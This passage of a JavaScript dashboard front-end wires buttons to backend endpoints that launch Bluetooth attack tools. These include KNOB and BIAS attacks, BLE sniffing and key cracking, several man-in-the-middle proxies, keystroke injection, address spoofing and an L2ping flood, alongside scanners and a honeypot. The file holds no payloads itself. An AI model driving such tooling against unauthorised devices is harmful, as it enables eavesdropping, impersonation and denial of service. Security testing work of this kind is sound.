    fetch('/api/cyber/recon/blesuite/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, scan_type: scanType })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('blesuiteOutput', data.output || 'Scan complete', 'success');
        } else {
            appendToolOutput('blesuiteOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('blesuiteOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Bleah scan
 */
function runBleah() {
    const target = document.getElementById('bleahTarget')?.value?.trim();
    const enumerate = document.getElementById('bleahEnumerate')?.checked;
    const force = document.getElementById('bleahForce')?.checked;

    clearToolOutput('bleahOutput');
    appendToolOutput('bleahOutput', 'Running Bleah scan...', 'info');

    fetch('/api/cyber/recon/bleah/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, enumerate, force })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('bleahOutput', data.output || 'Scan complete', 'success');
        } else {
            appendToolOutput('bleahOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bleahOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Redfang brute force
 */
function runRedfang() {
    const oui = document.getElementById('redfangOui')?.value?.trim();
    const range = parseInt(document.getElementById('redfangRange')?.value || '16');

    if (!oui) {
        addLogEntry('Redfang requires an OUI prefix', 'WARNING');
        return;
    }

    clearToolOutput('redfangOutput');
    appendToolOutput('redfangOutput', `Brute forcing from ${oui} (${range} addresses)...`, 'info');

    fetch('/api/cyber/recon/redfang/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ oui, range })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            if (data.found && data.found.length > 0) {
                data.found.forEach(addr => {
                    appendToolOutput('redfangOutput', `Found: ${addr}`, 'success');
                });
            } else {
                appendToolOutput('redfangOutput', 'No devices found in range', 'warning');
            }
        } else {
            appendToolOutput('redfangOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('redfangOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Spooftooph clone
 */
function runSpooftooph() {
    const source = document.getElementById('spooftoophSource')?.value?.trim();
    const iface = document.getElementById('spooftoophInterface')?.value;

    if (!source) {
        addLogEntry('Spooftooph requires a source address', 'WARNING');
        return;
    }

    clearToolOutput('spooftoophOutput');
    appendToolOutput('spooftoophOutput', `Cloning profile from ${source}...`, 'info');

    fetch('/api/cyber/recon/spooftooph/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ source, interface: iface })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('spooftoophOutput', `Profile cloned: ${data.cloned_name}`, 'success');
            appendToolOutput('spooftoophOutput', `New address: ${data.new_address}`, 'success');
        } else {
            appendToolOutput('spooftoophOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('spooftoophOutput', `Error: ${e}`, 'error'));
}

// ==================== SNIFFING TOOLS ====================

let spectrumInterval = null;
let spectrumCanvas = null;
let spectrumCtx = null;

/**
 * Start spectrum analyzer
 */
function startSpectrum() {
    spectrumCanvas = document.getElementById('spectrumCanvas');
    spectrumCtx = spectrumCanvas?.getContext('2d');

    if (!spectrumCtx) return;

    document.getElementById('btnStopSpectrum').disabled = false;

    fetch('/api/cyber/sniff/spectrum/start', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'started') {
                // Poll for spectrum data
                spectrumInterval = setInterval(updateSpectrum, 100);
            }
        });
}

function stopSpectrum() {
    if (spectrumInterval) {
        clearInterval(spectrumInterval);
        spectrumInterval = null;
    }

    document.getElementById('btnStopSpectrum').disabled = true;
    fetch('/api/cyber/sniff/spectrum/stop', { method: 'POST' });
}

function updateSpectrum() {
    fetch('/api/cyber/sniff/spectrum/data')
        .then(r => r.json())
        .then(data => {
            if (data.spectrum && spectrumCtx) {
                drawSpectrum(data.spectrum);
            }
        });
}

function drawSpectrum(spectrum) {
    const width = spectrumCanvas.width;
    const height = spectrumCanvas.height;
    const barWidth = width / spectrum.length;

    spectrumCtx.fillStyle = 'rgba(10, 14, 20, 0.3)';
    spectrumCtx.fillRect(0, 0, width, height);

    spectrum.forEach((val, i) => {
        const barHeight = (val / 255) * height;
        const hue = 180 + (val / 255) * 60; // Cyan to blue
        spectrumCtx.fillStyle = `hsl(${hue}, 100%, 50%)`;
        spectrumCtx.fillRect(i * barWidth, height - barHeight, barWidth - 1, barHeight);
    });
}

/**
 * Start Ubertooth BTLE sniffer
 */
function startUbertoothBtle() {
    const mode = document.getElementById('ubertoothBtleMode')?.value;
    const target = document.getElementById('ubertoothBtleTarget')?.value?.trim();
    const output = document.getElementById('ubertoothBtleOutput')?.value;

    clearToolOutput('ubertoothBtleOutput');
    appendToolOutput('ubertoothBtleOutput', 'Starting Ubertooth BTLE capture...', 'info');

    fetch('/api/cyber/sniff/ubertooth_btle/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode, target, output_format: output })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopUbertoothBtle').disabled = false;
            appendToolOutput('ubertoothBtleOutput', 'Capture started', 'success');
        } else {
            appendToolOutput('ubertoothBtleOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('ubertoothBtleOutput', `Error: ${e}`, 'error'));
}

function stopUbertoothBtle() {
    fetch('/api/cyber/sniff/ubertooth_btle/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopUbertoothBtle').disabled = true;
            appendToolOutput('ubertoothBtleOutput', 'Capture stopped', 'info');
            if (data.pcap_file) {
                appendToolOutput('ubertoothBtleOutput', `PCAP saved: ${data.pcap_file}`, 'success');
            }
        });
}

/**
 * Run BTLEJack
 */
function runBtlejack() {
    const mode = document.getElementById('btlejackMode')?.value;
    const accessAddress = document.getElementById('btlejackAA')?.value?.trim();

    clearToolOutput('btlejackOutput');
    appendToolOutput('btlejackOutput', `Starting BTLEJack in ${mode} mode...`, 'info');

    fetch('/api/cyber/sniff/btlejack/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode, access_address: accessAddress })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('btlejackOutput', data.output || 'Complete', 'success');
        } else {
            appendToolOutput('btlejackOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('btlejackOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Crackle
 */
function runCrackle() {
    const fileInput = document.getElementById('cracklePcap');
    const decrypt = document.getElementById('crackleDecrypt')?.checked;

    if (!fileInput?.files?.length) {
        addLogEntry('Please select a PCAP file', 'WARNING');
        return;
    }

    clearToolOutput('crackleOutput');
    appendToolOutput('crackleOutput', 'Cracking BLE encryption...', 'info');

    const formData = new FormData();
    formData.append('pcap', fileInput.files[0]);
    formData.append('decrypt', decrypt);

    fetch('/api/cyber/sniff/crackle/run', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            if (data.ltk) {
                appendToolOutput('crackleOutput', `LTK Found: ${data.ltk}`, 'success');
            }
            if (data.decrypted_file) {
                appendToolOutput('crackleOutput', `Decrypted: ${data.decrypted_file}`, 'success');
            }
        } else {
            appendToolOutput('crackleOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('crackleOutput', `Error: ${e}`, 'error'));
}

// ==================== EXPLOIT TOOLS ====================

/**
 * Run BlueToolkit vulnerability scan
 */
function runBlueToolkit() {
    const target = document.getElementById('bluetoolkitTarget')?.value?.trim();
    const mode = document.getElementById('bluetoolkitMode')?.value;
    const hardware = document.getElementById('bluetoolkitHardware')?.value;
    const checkpoint = document.getElementById('bluetoolkitCheckpoint')?.checked;
    const report = document.getElementById('bluetoolkitReport')?.checked;

    if (!target) {
        addLogEntry('BlueToolkit requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('bluetoolkitOutput');
    appendToolOutput('bluetoolkitOutput', `Starting BlueToolkit scan on ${target}...`, 'info');
    appendToolOutput('bluetoolkitOutput', `Mode: ${mode}, Hardware: ${hardware}`, 'info');

    let exploits = [];
    if (mode === 'custom') {
        const select = document.getElementById('bluetoolkitExploits');
        exploits = Array.from(select.selectedOptions).map(opt => opt.value);
    }

    fetch('/api/cyber/exploit/bluetoolkit/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            target,
            mode,
            hardware,
            checkpoint,
            report,
            exploits
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success' || data.status === 'started') {
            appendToolOutput('bluetoolkitOutput', 'Scan started - monitoring output...', 'success');
            if (data.vulnerabilities && data.vulnerabilities.length > 0) {
                appendToolOutput('bluetoolkitOutput', '\n=== VULNERABILITIES FOUND ===', 'error');
                data.vulnerabilities.forEach(vuln => {
                    appendToolOutput('bluetoolkitOutput', `[${vuln.severity}] ${vuln.name}: ${vuln.description}`,
                        vuln.severity === 'Critical' ? 'error' : 'warning');
                });
            }
            if (data.report_file) {
                appendToolOutput('bluetoolkitOutput', `\nReport saved: ${data.report_file}`, 'success');
            }
        } else {
            appendToolOutput('bluetoolkitOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bluetoolkitOutput', `Error: ${e}`, 'error'));
}

/**
 * Run BlueToolkit recon only
 */
function runBlueToolkitRecon() {
    const target = document.getElementById('bluetoolkitTarget')?.value?.trim();

    if (!target) {
        addLogEntry('BlueToolkit requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('bluetoolkitOutput');
    appendToolOutput('bluetoolkitOutput', `Running BlueToolkit reconnaissance on ${target}...`, 'info');

    fetch('/api/cyber/exploit/bluetoolkit/recon', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('bluetoolkitOutput', '\n=== DEVICE INFO ===', 'success');
            if (data.device_name) appendToolOutput('bluetoolkitOutput', `Name: ${data.device_name}`, 'info');
            if (data.device_class) appendToolOutput('bluetoolkitOutput', `Class: ${data.device_class}`, 'info');
            if (data.bt_version) appendToolOutput('bluetoolkitOutput', `BT Version: ${data.bt_version}`, 'info');
            if (data.manufacturer) appendToolOutput('bluetoolkitOutput', `Manufacturer: ${data.manufacturer}`, 'info');
            if (data.services) {
                appendToolOutput('bluetoolkitOutput', '\n=== SERVICES ===', 'success');
                data.services.forEach(svc => {
                    appendToolOutput('bluetoolkitOutput', `  ${svc}`, 'info');
                });
            }
            if (data.sc_supported !== undefined) {
                appendToolOutput('bluetoolkitOutput', `\nSecure Connections: ${data.sc_supported ? 'Supported' : 'NOT Supported'}`,
                    data.sc_supported ? 'success' : 'warning');
            }
        } else {
            appendToolOutput('bluetoolkitOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bluetoolkitOutput', `Error: ${e}`, 'error'));
}

/**
 * List available BlueToolkit exploits
 */
function listBlueToolkitExploits() {
    clearToolOutput('bluetoolkitOutput');
    appendToolOutput('bluetoolkitOutput', 'Fetching exploit list...', 'info');

    fetch('/api/cyber/exploit/bluetoolkit/list')
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success' && data.exploits) {
                appendToolOutput('bluetoolkitOutput', '\n=== AVAILABLE EXPLOITS ===\n', 'success');
                data.exploits.forEach(exp => {
                    const line = `[${exp.category}] ${exp.name} - ${exp.type} (${exp.verification})`;
                    const type = exp.category === 'Critical' ? 'error' : exp.category === 'MitM' ? 'warning' : 'info';
                    appendToolOutput('bluetoolkitOutput', line, type);
                });
            } else {
                appendToolOutput('bluetoolkitOutput', `Error: ${data.error}`, 'error');
            }
        })
        .catch(e => appendToolOutput('bluetoolkitOutput', `Error: ${e}`, 'error'));
}

// Handle BlueToolkit mode change
document.addEventListener('DOMContentLoaded', () => {
    const modeSelect = document.getElementById('bluetoolkitMode');
    if (modeSelect) {
        modeSelect.addEventListener('change', function() {
            const customRow = document.getElementById('bluetoolkitCustomRow');
            if (customRow) {
                customRow.classList.toggle('hidden', this.value !== 'custom');
            }
        });
    }
});

/**
 * Run BlueBorne vulnerability scan
 */
function runBlueborneScan() {
    const target = document.getElementById('blueborneTarget')?.value?.trim();

    if (!target) {
        addLogEntry('BlueBorne scanner requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('blueborneOutput');
    appendToolOutput('blueborneOutput', `Scanning ${target} for BlueBorne vulnerabilities...`, 'info');

    fetch('/api/cyber/exploit/blueborne/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            if (data.vulnerabilities && data.vulnerabilities.length > 0) {
                appendToolOutput('blueborneOutput', 'VULNERABILITIES FOUND:', 'error');
                data.vulnerabilities.forEach(vuln => {
                    appendToolOutput('blueborneOutput', `  ${vuln.cve}: ${vuln.description}`, 'error');
                });
            } else {
                appendToolOutput('blueborneOutput', 'No vulnerabilities detected', 'success');
            }
            appendToolOutput('blueborneOutput', `Device: ${data.device_info || 'Unknown'}`, 'info');
        } else {
            appendToolOutput('blueborneOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('blueborneOutput', `Error: ${e}`, 'error'));
}

/**
 * Run KNOB attack
 */
function runKnobAttack() {
    const target = document.getElementById('knobTarget')?.value?.trim();
    const entropy = document.getElementById('knobEntropy')?.value;

    if (!target) {
        addLogEntry('KNOB attack requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('knobOutput');
    appendToolOutput('knobOutput', `Running KNOB attack on ${target}...`, 'info');
    appendToolOutput('knobOutput', `Forcing ${entropy}-byte entropy`, 'warning');

    fetch('/api/cyber/exploit/knob/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, entropy_bytes: parseInt(entropy) })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('knobOutput', 'KNOB attack succeeded', 'success');
            if (data.negotiated_entropy) {
                appendToolOutput('knobOutput', `Negotiated entropy: ${data.negotiated_entropy} bytes`, 'success');
            }
        } else {
            appendToolOutput('knobOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('knobOutput', `Error: ${e}`, 'error'));
}

/**
 * Run BIAS attack
 */
function runBiasAttack() {
    const target = document.getElementById('biasTarget')?.value?.trim();
    const impersonate = document.getElementById('biasImpersonate')?.value?.trim();

    if (!target || !impersonate) {
        addLogEntry('BIAS attack requires target and device to impersonate', 'WARNING');
        return;
    }

    clearToolOutput('biasOutput');
    appendToolOutput('biasOutput', `Running BIAS attack: impersonating ${impersonate}...`, 'info');

    fetch('/api/cyber/exploit/bias/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, impersonate })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('biasOutput', 'BIAS attack succeeded - impersonation established', 'success');
        } else {
            appendToolOutput('biasOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('biasOutput', `Error: ${e}`, 'error'));
}

/**
 * Run SDP leak
 */
function runSdpLeak() {
    const target = document.getElementById('sdpLeakTarget')?.value?.trim();

    if (!target) {
        addLogEntry('SDP leak requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('sdpLeakOutput');
    appendToolOutput('sdpLeakOutput', `Extracting SDP info from ${target}...`, 'info');

    fetch('/api/cyber/exploit/sdp_leak/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('sdpLeakOutput', 'SDP Information:', 'success');
            if (data.services) {
                data.services.forEach(svc => {
                    appendToolOutput('sdpLeakOutput', `  ${svc.name}: ${svc.uuid}`, 'info');
                });
            }
            if (data.device_info) {
                appendToolOutput('sdpLeakOutput', `Device: ${data.device_info}`, 'info');
            }
        } else {
            appendToolOutput('sdpLeakOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('sdpLeakOutput', `Error: ${e}`, 'error'));
}

// ==================== MITM TOOLS ====================

/**
 * Start BTLEJuice
 */
function startBtlejuice() {
    const target = document.getElementById('btlejuiceTarget')?.value?.trim();
    const iface = document.getElementById('btlejuiceInterface')?.value;

    if (!target) {
        addLogEntry('BTLEJuice requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('btlejuiceOutput');
    appendToolOutput('btlejuiceOutput', 'Starting BTLEJuice proxy...', 'info');

    fetch('/api/cyber/mitm/btlejuice/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, interface: iface })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopBtlejuice').disabled = false;
            appendToolOutput('btlejuiceOutput', 'Proxy started - waiting for connection', 'success');
            appendToolOutput('btlejuiceOutput', `Web UI: http://localhost:${data.port || 8080}`, 'info');
        } else {
            appendToolOutput('btlejuiceOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('btlejuiceOutput', `Error: ${e}`, 'error'));
}

function stopBtlejuice() {
    fetch('/api/cyber/mitm/btlejuice/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopBtlejuice').disabled = true;
            appendToolOutput('btlejuiceOutput', 'Proxy stopped', 'info');
        });
}

/**
 * Run GATTacker
 */
function runGattacker() {
    const target = document.getElementById('gattackerTarget')?.value?.trim();
    const relay = document.getElementById('gattackerRelay')?.checked;
    const log = document.getElementById('gattackerLog')?.checked;

    if (!target) {
        addLogEntry('GATTacker requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('gattackerOutput');
    appendToolOutput('gattackerOutput', `Cloning ${target}...`, 'info');

    fetch('/api/cyber/mitm/gattacker/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, relay, log })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('gattackerOutput', 'Clone created - MITM active', 'success');
        } else {
            appendToolOutput('gattackerOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('gattackerOutput', `Error: ${e}`, 'error'));
}

/**
 * Run BT Proxy
 */
function runBtproxy() {
    const master = document.getElementById('btproxyMaster')?.value?.trim();
    const slave = document.getElementById('btproxySlave')?.value?.trim();

    if (!master || !slave) {
        addLogEntry('BT Proxy requires both master and slave addresses', 'WARNING');
        return;
    }

    clearToolOutput('btproxyOutput');
    appendToolOutput('btproxyOutput', `Setting up proxy between ${master} and ${slave}...`, 'info');

    fetch('/api/cyber/mitm/btproxy/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ master, slave })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('btproxyOutput', 'Proxy active - intercepting traffic', 'success');
        } else {
            appendToolOutput('btproxyOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('btproxyOutput', `Error: ${e}`, 'error'));
}

/**
 * Run BLE Replay
 */
function runBleReplay() {
    const fileInput = document.getElementById('blereplayFile');
    const target = document.getElementById('blereplayTarget')?.value?.trim();

    if (!fileInput?.files?.length) {
        addLogEntry('Please select a capture file', 'WARNING');
        return;
    }

    clearToolOutput('blereplayOutput');
    appendToolOutput('blereplayOutput', 'Replaying captured traffic...', 'info');

    const formData = new FormData();
    formData.append('capture', fileInput.files[0]);
    if (target) formData.append('target', target);

    fetch('/api/cyber/mitm/ble_replay/run', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('blereplayOutput', 'Replay complete', 'success');
            appendToolOutput('blereplayOutput', `Packets replayed: ${data.packets_sent || 0}`, 'info');
        } else {
            appendToolOutput('blereplayOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('blereplayOutput', `Error: ${e}`, 'error'));
}

// ==================== INJECTION TOOLS ====================

/**
 * Run Uberducky
 */
function runUberducky() {
    const target = document.getElementById('uberduckyTarget')?.value?.trim();
    const script = document.getElementById('uberduckyScript')?.value?.trim();

    if (!target || !script) {
        addLogEntry('Uberducky requires target address and script', 'WARNING');
        return;
    }

    clearToolOutput('uberduckyOutput');
    appendToolOutput('uberduckyOutput', 'Running Uberducky script...', 'info');

    fetch('/api/cyber/inject/uberducky/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, script })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('uberduckyOutput', 'Script executed', 'success');
        } else {
            appendToolOutput('uberduckyOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('uberduckyOutput', `Error: ${e}`, 'error'));
}

// ==================== FIRMWARE TOOLS ====================

/**
 * Run InternalBlue
 */
function runInternalblue() {
    const device = document.getElementById('internalblueDevice')?.value;
    const action = document.getElementById('internalblueAction')?.value;

    clearToolOutput('internalblueOutput');
    appendToolOutput('internalblueOutput', `Running InternalBlue (${action})...`, 'info');

    fetch('/api/cyber/firmware/internalblue/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device, action })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('internalblueOutput', data.output || 'Complete', 'success');
        } else {
            appendToolOutput('internalblueOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('internalblueOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Frankenstein
 */
function runFrankenstein() {
    const fileInput = document.getElementById('frankensteinFirmware');
    const mode = document.getElementById('frankensteinMode')?.value;

    if (!fileInput?.files?.length) {
        addLogEntry('Please select a firmware file', 'WARNING');
        return;
    }

    clearToolOutput('frankensteinOutput');
    appendToolOutput('frankensteinOutput', `Running Frankenstein (${mode})...`, 'info');

    const formData = new FormData();
    formData.append('firmware', fileInput.files[0]);
    formData.append('mode', mode);

    fetch('/api/cyber/firmware/frankenstein/run', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('frankensteinOutput', data.output || 'Complete', 'success');
        } else {
            appendToolOutput('frankensteinOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('frankensteinOutput', `Error: ${e}`, 'error'));
}

/**
 * Run Polypyus
 */
function runPolypyus() {
    const refInput = document.getElementById('polypyusReference');
    const targetInput = document.getElementById('polypyusTarget');

    if (!refInput?.files?.length || !targetInput?.files?.length) {
        addLogEntry('Please select both reference and target binaries', 'WARNING');
        return;
    }

    clearToolOutput('polypyusOutput');
    appendToolOutput('polypyusOutput', 'Analyzing binaries...', 'info');

    const formData = new FormData();
    formData.append('reference', refInput.files[0]);
    formData.append('target', targetInput.files[0]);

    fetch('/api/cyber/firmware/polypyus/run', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('polypyusOutput', `Found ${data.matches || 0} function matches`, 'success');
        } else {
            appendToolOutput('polypyusOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('polypyusOutput', `Error: ${e}`, 'error'));
}

// ==================== UTILITY TOOLS ====================

/**
 * Run Bluefog
 */
function runBluefog() {
    const count = parseInt(document.getElementById('bluefogCount')?.value || '10');
    const deviceClass = document.getElementById('bluefogClass')?.value;

    clearToolOutput('bluefogOutput');
    appendToolOutput('bluefogOutput', `Creating ${count} fake devices...`, 'info');

    fetch('/api/cyber/utils/bluefog/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ count, device_class: deviceClass })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopBluefog').disabled = false;
            appendToolOutput('bluefogOutput', `Fog active: ${data.devices_created} fake devices`, 'success');
        } else {
            appendToolOutput('bluefogOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bluefogOutput', `Error: ${e}`, 'error'));
}

function stopBluefog() {
    fetch('/api/cyber/utils/bluefog/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopBluefog').disabled = true;
            appendToolOutput('bluefogOutput', 'Fog stopped', 'info');
        });
}

/**
 * Start BLE Beacon
 */
function startBeacon() {
    const type = document.getElementById('beaconType')?.value;
    const uuid = document.getElementById('beaconUuid')?.value?.trim();
    const url = document.getElementById('beaconUrl')?.value?.trim();
    const txPower = document.getElementById('beaconTxPower')?.value;

    fetch('/api/cyber/utils/beacon/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, uuid, url, tx_power: txPower })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopBeacon').disabled = false;
            addLogEntry('Beacon broadcasting', 'INFO');
        } else {
            addLogEntry(`Beacon error: ${data.error}`, 'ERROR');
        }
    });
}

function stopBeacon() {
    fetch('/api/cyber/utils/beacon/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopBeacon').disabled = true;
            addLogEntry('Beacon stopped', 'INFO');
        });
}

/**
 * Start Bluepot honeypot
 */
function startBluepot() {
    const sdp = document.getElementById('bluepotSdp')?.checked;
    const obex = document.getElementById('bluepotObex')?.checked;
    const hid = document.getElementById('bluepotHid')?.checked;

    clearToolOutput('bluepotOutput');
    appendToolOutput('bluepotOutput', 'Starting honeypot...', 'info');

    fetch('/api/cyber/utils/bluepot/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ emulate_sdp: sdp, emulate_obex: obex, emulate_hid: hid })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopBluepot').disabled = false;
            appendToolOutput('bluepotOutput', 'Honeypot active - monitoring for attacks', 'success');
        } else {
            appendToolOutput('bluepotOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bluepotOutput', `Error: ${e}`, 'error'));
}

function stopBluepot() {
    fetch('/api/cyber/utils/bluepot/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopBluepot').disabled = true;
            appendToolOutput('bluepotOutput', 'Honeypot stopped', 'info');
            if (data.attacks_logged > 0) {
                appendToolOutput('bluepotOutput', `Attacks logged: ${data.attacks_logged}`, 'warning');
            }
        });
}

/**
 * Generate random BD address
 */
function generateRandomBdaddr() {
    const hexChars = '0123456789ABCDEF';
    let addr = '';
    for (let i = 0; i < 6; i++) {
        if (i > 0) addr += ':';
        addr += hexChars[Math.floor(Math.random() * 16)];
        addr += hexChars[Math.floor(Math.random() * 16)];
    }
    document.getElementById('bdaddrNew').value = addr;
}

/**
 * Change BD address
 */
function changeBdaddr() {
    const iface = document.getElementById('bdaddrInterface')?.value;
    const newAddr = document.getElementById('bdaddrNew')?.value?.trim();

    if (!newAddr || !newAddr.match(/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/)) {
        addLogEntry('Invalid BD address format', 'WARNING');
        return;
    }

    clearToolOutput('bdaddrOutput');
    appendToolOutput('bdaddrOutput', `Changing ${iface} to ${newAddr}...`, 'info');

    fetch('/api/cyber/utils/bdaddr/change', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ interface: iface, new_address: newAddr })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('bdaddrOutput', 'Address changed successfully', 'success');
        } else {
            appendToolOutput('bdaddrOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bdaddrOutput', `Error: ${e}`, 'error'));
}

function resetBdaddr() {
    const iface = document.getElementById('bdaddrInterface')?.value;

    clearToolOutput('bdaddrOutput');
    appendToolOutput('bdaddrOutput', `Resetting ${iface} to original address...`, 'info');

    fetch('/api/cyber/utils/bdaddr/reset', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ interface: iface })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            appendToolOutput('bdaddrOutput', `Reset to ${data.original_address}`, 'success');
        } else {
            appendToolOutput('bdaddrOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('bdaddrOutput', `Error: ${e}`, 'error'));
}

/**
 * Run L2ping flood
 */
function runL2pingFlood() {
    const target = document.getElementById('l2pingTarget')?.value?.trim();
    const size = parseInt(document.getElementById('l2pingSize')?.value || '44');
    const count = parseInt(document.getElementById('l2pingCount')?.value || '100');

    if (!target) {
        addLogEntry('L2ping requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('l2pingOutput');
    appendToolOutput('l2pingOutput', `Sending ${count} packets (${size} bytes) to ${target}...`, 'info');

    fetch('/api/cyber/utils/l2ping/flood', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, size, count })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopL2ping').disabled = false;
            appendToolOutput('l2pingOutput', 'Flood started', 'warning');
        } else {
            appendToolOutput('l2pingOutput', `Error: ${data.error}`, 'error');
